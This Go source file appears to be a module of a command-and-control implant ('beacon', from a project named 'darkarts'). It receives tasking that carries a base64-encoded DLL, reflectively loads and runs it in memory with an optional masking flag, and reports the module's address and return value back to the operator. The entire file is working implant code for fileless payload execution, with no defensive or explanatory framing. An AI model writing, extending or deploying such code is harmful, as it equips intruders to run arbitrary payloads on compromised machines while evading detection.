//go:build inject

package beacon

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	"darkarts/pkg/reflective"
	"darkarts/pkg/tasking"
)

func (e *Executor) runDll(payload []byte, res *tasking.Result) {
	var p struct {
		Data string `json:"data"`
		Fn   string `json:"fn"`
		Mask bool   `json:"mask"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	raw, err := base64.StdEncoding.DecodeString(p.Data)
	if err != nil {
		res.Error = err.Error()
		return
	}
	ret, mod, err := reflective.LoadAndRun(raw, p.Fn, reflective.Options{Mask: p.Mask})
	if err != nil {
		res.Error = err.Error()
		return
	}
	out, err := json.Marshal(map[string]any{
		"base":   fmt.Sprintf("0x%X", mod.Base),
		"size":   mod.Size,
		"attach": true,
		"fn":     p.Fn,
		"ret":    fmt.Sprintf("0x%X", ret),
	})
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = out
}
